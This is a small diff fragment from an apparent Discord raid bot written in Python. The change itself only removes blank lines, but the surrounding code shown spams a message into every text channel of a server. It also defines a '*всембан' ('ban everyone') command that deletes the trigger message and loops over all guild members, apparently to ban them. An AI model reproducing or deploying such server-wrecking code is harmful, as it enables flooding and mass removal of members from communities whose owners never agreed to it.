@@ -88,9 +88,6 @@ class MyClient(discord.Client):
             				for channel in message.guild.text_channels:
                 				await channel.send(spam)
 						s = s + 1
-					
-						
-				
 			if message.content == '*всембан': #бан всех участников
 				await message.delete()
 				for i in message.guild.members:
